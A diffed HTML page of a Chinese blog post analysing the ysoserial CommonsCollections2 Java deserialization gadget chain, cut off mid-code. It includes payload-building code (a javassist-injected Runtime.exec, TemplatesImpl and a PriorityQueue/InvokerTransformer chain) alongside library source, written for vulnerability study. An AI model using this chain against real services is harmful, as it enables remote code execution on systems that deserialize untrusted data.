@@ -1,0 +1,900 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="前一段时间一直在思考如何发掘java反序列化漏洞，最近有一点小的成果，因此借着学习著名的java反序列化利用工具ysoserial来整理下自己的思路。">
+<meta name="keywords" content="Java反序列化">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java反序列化学习-CommonsCollections2">
+<meta property="og:url" content="http://yoursite.com/2019/10/03/Java反序列化学习-CommonsCollections2/index.html">
+<meta property="og:site_name" content="红猪的笔记">
+<meta property="og:description" content="前一段时间一直在思考如何发掘java反序列化漏洞，最近有一点小的成果，因此借着学习著名的java反序列化利用工具ysoserial来整理下自己的思路。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-10-03T04:44:46.406Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Java反序列化学习-CommonsCollections2">
+<meta name="twitter:description" content="前一段时间一直在思考如何发掘java反序列化漏洞，最近有一点小的成果，因此借着学习著名的java反序列化利用工具ysoserial来整理下自己的思路。">
+
+
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/10/03/Java反序列化学习-CommonsCollections2/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>Java反序列化学习-CommonsCollections2 | 红猪的笔记</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">红猪的笔记</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">I am always on the way</p>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />首页</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />关于</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />标签</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />分类</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />归档</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/03/Java反序列化学习-CommonsCollections2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="红猪">
+      <meta itemprop="description" content="我活在世上，无非想要明白些道理，遇见些有趣的事。倘能如我所愿，我的一生就算成功。">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="红猪的笔记">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Java反序列化学习-CommonsCollections2
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-10-03 12:42:01 / 修改时间：12:44:46" itemprop="dateCreated datePublished" datetime="2019-10-03T12:42:01+08:00">2019-10-03</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/漏洞学习/" itemprop="url" rel="index"><span itemprop="name">漏洞学习</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>前一段时间一直在思考如何发掘java反序列化漏洞，最近有一点小的成果，因此借着学习著名的java反序列化利用工具ysoserial来整理下自己的思路。</p>
+<a id="more"></a>
+<h3 id="Java反序列化利用"><a href="#Java反序列化利用" class="headerlink" title="Java反序列化利用"></a>Java反序列化利用</h3><p>要想掌握Java反序列化漏洞payload的构造，那就要知道在构造Java反序列化的payload的构造过程中有三个比较特别重要的步骤，在这里简称为两点一链：</p>
+<h4 id="输入数据执行点"><a href="#输入数据执行点" class="headerlink" title="输入数据执行点"></a>输入数据执行点</h4><p>输入数据执行点是指能够将攻击者控制的数据作为java代码执行的位置。</p>
+<h4 id="反序列化传导链"><a href="#反序列化传导链" class="headerlink" title="反序列化传导链"></a>反序列化传导链</h4><p>反序列化传导链主要用作链接反序列化利用点和用户数据可控点，能够使用户可控的数据在反序列化过程中被利用。</p>
+<h4 id="反序列化利用点"><a href="#反序列化利用点" class="headerlink" title="反序列化利用点"></a>反序列化利用点</h4><p>反序列化是指在程序的执行流程中有执行反序列化的操作。该位置一般为程序自身实现，只需定位即可。</p>
+<h3 id="CommonsCollections2"><a href="#CommonsCollections2" class="headerlink" title="CommonsCollections2"></a>CommonsCollections2</h3><p>下面就对ysoserial中的各个payload的构造来讲解上面所说的两点一链。下面看一下CommonCollections2这个payload。</p>
+<h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>Java Collections Framework 是JDK 1.2中的一个重要组成部分。它增加了许多强大的数据结构，加速了最重要的Java应用程序的开发。从那时起，它已经成为Java中集合处理的公认标准。官网介绍如下:Commons Collections使用场景很广，很多商业,开源项目都使用到了commons-collections.jar。 很多组件，容器，cms(诸如WebLogic、WebSphere、JBoss、Jenkins、OpenNMS等)的rce漏洞都和Commons Collections反序列被披露事件有关。</p>
+<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>JDK 未测试，7u21正常使用<br>CommonCollections=4.0</p>
+<h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><p><em>并未完全按照ysoserial中的代码进行分析，而是结合前面的思考结果进行分析。</em></p>
+<h5 id="输入数据执行点-1"><a href="#输入数据执行点-1" class="headerlink" title="输入数据执行点"></a>输入数据执行点</h5><p>在CommonsCollections2当中，尽管在本次实验中发现也可以通过ChainedTransform构造出攻击链，但作者并没有使用ChainedTransformer来制作payload，可能作者是想要提供一种新的输入数据执行点构造思路。<br>下面来看一下ysoseria构造数据执行点的方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">Class superClazz = Class.forName(&quot;org.apache.xalan.xsltc.runtime.AbstractTranslet&quot;);</span><br><span class="line">Class transFactory = Class.forName(&quot;org.apache.xalan.xsltc.trax.TransformerFactoryImpl&quot;)</span><br><span class="line"></span><br><span class="line">// 利用javassist包动态加载并修改代码</span><br><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));</span><br><span class="line">final CtClass ctClass = pool.get(StubTransletPayload.class.getName());</span><br><span class="line">String cmd  = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;</span><br><span class="line">// 创建一个类代码块（static修饰的代码块），然后在该代码块后面插入要执行的代码，会在该类的静态代码框中插入该方法，因此类初始化便会执行代码</span><br><span class="line">ctClass.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">CtClass superCtClass = pool.get(superClazz.getName());</span><br><span class="line">ctClass.setSuperclass(superCtClass);</span><br><span class="line">// 将生成的类转换成字节</span><br><span class="line">byte[] bytes = ctClass.toBytecode();</span><br><span class="line">// TemplatesImpl便是承载此次数据的类</span><br><span class="line">String templateClassName= &quot;org.apache.xalan.xsltc.trax.TemplatesImpl&quot;;</span><br><span class="line">Class templateClazz = Class.forName(templateClassName);</span><br><span class="line"></span><br><span class="line">// 通过反射的方式获取TemplatesImpl实例的_bytecodes字段和_name字段</span><br><span class="line">Field templateField = templateClazz.getDeclaredField(&quot;_bytecodes&quot;);</span><br><span class="line">Permit.setAccessible(templateField);</span><br><span class="line">Field nameField = templateClazz.getDeclaredField(&quot;_name&quot;);</span><br><span class="line">Permit.setAccessible(nameField);</span><br><span class="line">Field factoryField = templateClazz.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="line">Permit.setAccessible(factoryField);</span><br><span class="line"></span><br><span class="line">Templates templatesInstance = (Templates) templateClazz.newInstance();</span><br><span class="line">byte[] tempBytes = new byte[1024];</span><br><span class="line">// Foo类是一个内部静态类，主要是辅助的将控制的代码注入到TemplateImpl实例当中</span><br><span class="line">Class fooClass = Foo.class;</span><br><span class="line">// getEnclosingClass指获取外部类</span><br><span class="line">Class parentClass = fooClass.getEnclosingClass();</span><br><span class="line">String fullName = parentClass.getName().replace(&quot;.&quot;,&quot;/&quot;)+&quot;$&quot;+fooClass.getSimpleName()+&quot;.class&quot;;</span><br><span class="line">InputStream tempFileInputStream = JavassistDemo.class.getClassLoader().getResourceAsStream(fullName);</span><br><span class="line">ByteArrayOutputStream out = new ByteArrayOutputStream();</span><br><span class="line">int len =0;</span><br><span class="line">while((len = tempFileInputStream.read(tempBytes))!= -1) &#123;</span><br><span class="line">    out.write(tempBytes, 0, len);</span><br><span class="line">&#125;</span><br><span class="line">// 将数据注入到TemplatesImpl实例当中</span><br><span class="line">templateField.set(templatesInstance,new byte[][]&#123;</span><br><span class="line">        bytes,out.toByteArray()</span><br><span class="line">&#125;);</span><br><span class="line">// 必需设置该值</span><br><span class="line">nameField.set(templatesInstance,&quot;Pwnr&quot;);</span><br><span class="line">factoryField.set(transFactory.newInstance(),&quot;_tfactory&quot;);</span><br></pre></td></tr></table></figure></p>
+<p>Foo.java (一个内部类)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">public static class Foo implements Serializable &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>StubTransletPayload.java<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public class StubTransletPayload extends AbstractTranslet implements Serializable &#123;</span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handlers) throws TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>分析上面的代码可以知道，上面的代码主要是利用Javassist动态生成一个恶意类，然后将其注入到TempaltesImpl实例中的_bytecodes字段。<br>如何这样做的原因需要对TemplatesImpl类的代码进行分析，下面就截取TemplatesImpl类的代码进行查看：<br>TemplatesImpl.java<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">public synchronized Transformer newTransformer() throws   TransformerConfigurationException &#123;</span><br><span class="line">	TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">	transformer = new TransformerImpl(getTransletInstance(), _outputProperties,</span><br><span class="line">	    _indentNumber, _tfactory);</span><br><span class="line">	</span><br><span class="line">	if (_uriResolver != null) &#123;</span><br><span class="line">	    transformer.setURIResolver(_uriResolver);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;</span><br><span class="line">	    transformer.setSecureProcessing(true);</span><br><span class="line">	&#125;</span><br><span class="line">	return transformer;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">private Translet getTransletInstance() throws TransformerConfigurationException &#123;</span><br><span class="line">	try &#123;</span><br><span class="line">	    if (_name == null) return null;</span><br><span class="line"></span><br><span class="line">	    if (_class == null) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">	    // The translet needs to keep a reference to all its auxiliary </span><br><span class="line">	    // class to prevent the GC from collecting them</span><br><span class="line">            // 实例化每个类</span><br><span class="line">	    AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line">            translet.postInitialization();</span><br><span class="line">	    translet.setTemplates(this);</span><br><span class="line">	    if (_auxClasses != null) &#123;</span><br><span class="line">	        translet.setAuxiliaryClasses(_auxClasses);</span><br><span class="line">	    &#125;</span><br><span class="line">	    </span><br><span class="line">	    return translet;</span><br><span class="line">	&#125;</span><br><span class="line">	catch (InstantiationException e) &#123;</span><br><span class="line">	    ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">	    throw new TransformerConfigurationException(err.toString());</span><br><span class="line">	&#125;</span><br><span class="line">	catch (IllegalAccessException e) &#123;</span><br><span class="line">	    ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">	    throw new TransformerConfigurationException(err.toString());</span><br><span class="line">	&#125;</span><br><span class="line"> &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">private void defineTransletClasses() throws TransformerConfigurationException &#123;</span><br><span class="line"></span><br><span class="line">	if (_bytecodes == null) &#123;</span><br><span class="line">	    ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">	    throw new TransformerConfigurationException(err.toString());</span><br><span class="line">	&#125;</span><br><span class="line">        TransletClassLoader loader = (TransletClassLoader)</span><br><span class="line">            AccessController.doPrivileged(new PrivilegedAction() &#123;</span><br><span class="line">                public Object run() &#123;</span><br><span class="line">                    return new TransletClassLoader(ObjectFactory.findClassLoader());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">	try &#123;</span><br><span class="line">	    final int classCount = _bytecodes.length;</span><br><span class="line">	    _class = new Class[classCount];</span><br><span class="line"></span><br><span class="line">	    if (classCount &gt; 1) &#123;</span><br><span class="line">	        _auxClasses = new Hashtable();</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	    for (int i = 0; i &lt; classCount; i++) &#123;</span><br><span class="line">                // 将字节转换成类</span><br><span class="line">		_class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">		final Class superClass = _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">		// Check if this is the main class</span><br><span class="line">		if (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">		    _transletIndex = i;</span><br><span class="line">		&#125;</span><br><span class="line">		else &#123;</span><br><span class="line">		    _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	    if (_transletIndex &lt; 0) &#123;</span><br><span class="line">		ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">		throw new TransformerConfigurationException(err.toString());</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	catch (ClassFormatError e) &#123;</span><br><span class="line">	    ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);</span><br><span class="line">	    throw new TransformerConfigurationException(err.toString());</span><br><span class="line">	&#125;</span><br><span class="line">	catch (LinkageError e) &#123;</span><br><span class="line">	    ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">	    throw new TransformerConfigurationException(err.toString());</span><br><span class="line">	&#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p>
+<p>可以看到在TemplateImpl的代码当中newTransformer()方法会调用getTransletInstance()方法，其中getTransletInstance()方法会先调用defineTransletClasses()方法将_bytecodes字段中的数据转换成_class,然后getTransletInstance()接下来会将这些_class进行实例化。因此放入到_bytescode变量中的类会被实例化，植入的恶意代码也被执行。</p>
+<h5 id="反序列化传导链-1"><a href="#反序列化传导链-1" class="headerlink" title="反序列化传导链"></a>反序列化传导链</h5><p>从上面可以知道通过向TemplatesImpl的_bytecodes字段注入恶意的代码，然后再调用TemplatesImpl实例的newTransformer()方法便可以实现任意代码执行。下面再找一个能够串联反序列化点和该漏洞利用点相结合的链条即可。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;toString&quot;,new Class[0],new Object[0]);</span><br><span class="line">PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2,new TransformingComparator(invokerTransformer))</span><br><span class="line">queue.add(1);</span><br><span class="line">queue.add(2);</span><br><span class="line">// 修改InvokerTransformer实例的iMethodName参数为newTransformer，这样调用InvokerTransformer方法时会调用传入实例的newTransformer方法。</span><br><span class="line">Field transformerField = InvokerTransformer.class.getDeclaredField(&quot;iMethodName&quot;);</span><br><span class="line">Permit.setAccessible(transformerField);</span><br><span class="line">transformerField.set(invokerTransformer,&quot;newTransformer&quot;);</span><br><span class="line"></span><br><span class="line">// 利用反射设置PriorityQueue中的值，必需将第一个值设置为TemplatesImpl的实例，这样才能保证后面可以调用其newTransformer方法</span><br><span class="line">Field queueField = PriorityQueue.class.getDeclaredField(&quot;queue&quot;);</span><br><span class="line">Permit.setAccessible(queueField);</span><br><span class="line">Object[] ququeArray = (Object[]) queueField.get(queue);</span><br><span class="line">ququeArray[0] = templatesInstance;</span><br><span class="line">ququeArray[1] = 1;</span><br></pre></td></tr></table></figure></p>
+<p>可以看到其主要是利用了InvokerTransformer、TransformingComparator、PriorityQueue(优先队列)三个类来构造传导链。其中主要是利用PriorityQueue作为反序列化的入口点，然后依次调用TransformingComparator、InvokerTransformer类的实例，从而执行TemplatesImple实例的newTransformer方法，最后导致命令执行。下面依次从这些类的源代码中分析下传导链中各个方法的执行顺序。<br>InvokerTransformer.java<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">public O transform(final Object input) &#123;</span><br><span class="line">     if (input == null) &#123;</span><br><span class="line">         return null;</span><br><span class="line">     &#125;</span><br><span class="line">     try &#123;</span><br><span class="line">         final Class&lt;?&gt; cls = input.getClass();</span><br><span class="line">         final Method method = cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">         return (O) method.invoke(input, iArgs);</span><br><span class="line">     &#125; catch (final NoSuchMethodException ex) &#123;</span><br><span class="line">         throw new FunctorException(&quot;InvokerTransformer: The method &apos;&quot; + iMethodName + &quot;&apos; on &apos;&quot; +</span><br><span class="line">                                    input.getClass() + &quot;&apos; does not exist&quot;);</span><br><span class="line">     &#125; catch (final IllegalAccessException ex) &#123;</span><br><span class="line">         throw new FunctorException(&quot;InvokerTransformer: The method &apos;&quot; + iMethodName + &quot;&apos; on &apos;&quot; +</span><br><span class="line">                                    input.getClass() + &quot;&apos; cannot be accessed&quot;);</span><br><span class="line">     &#125; catch (final InvocationTargetException ex) &#123;</span><br><span class="line">         throw new FunctorException(&quot;InvokerTransformer: The method &apos;&quot; + iMethodName + &quot;&apos; on &apos;&quot; +</span><br><span class="line">                                    input.getClass() + &quot;&apos; threw an exception&quot;, ex);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p>
+<p>可以看到InvokerTransformer的transform方法能够利用反射调用传入实例对象的一个固定方法。在这里是调用TemplatesImpl实例的newTransformer方法，因此在源代码中会利用反射将该实例的iMethodName修改为newTransformer方法。<br>TransformingComparator.java<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public int compare(final I obj1, final I obj2) &#123;</span><br><span class="line">     final O value1 = this.transformer.transform(obj1);</span><br><span class="line">     final O value2 = this.transformer.transform(obj2);</span><br><span class="line">     return this.decorated.compare(value1, value2);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p>
+<p>该类的实例具有胶连InvokerTransformer实例和PriorityQueue实例的作用，PriorityQueue会调用该类的compare方法，并传入Queue中的实例templateImpl，然后调用InvokerTransform的transform方法。<br>PriorityQueue.java<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"> private void siftDownUsingComparator(int k, E x) &#123;</span><br><span class="line">     int half = size &gt;&gt;&gt; 1;</span><br><span class="line">     while (k &lt; half) &#123;</span><br><span class="line">         int child = (k &lt;&lt; 1) + 1;</span><br><span class="line">         Object c = queue[child];</span><br><span class="line">         int right = child + 1;</span><br><span class="line">         if (right &lt; size &amp;&amp;</span><br><span class="line">             comparator.compare((E) c, (E) queue[right]) &gt; 0)</span><br><span class="line">             c = queue[child = right];</span><br><span class="line">         if 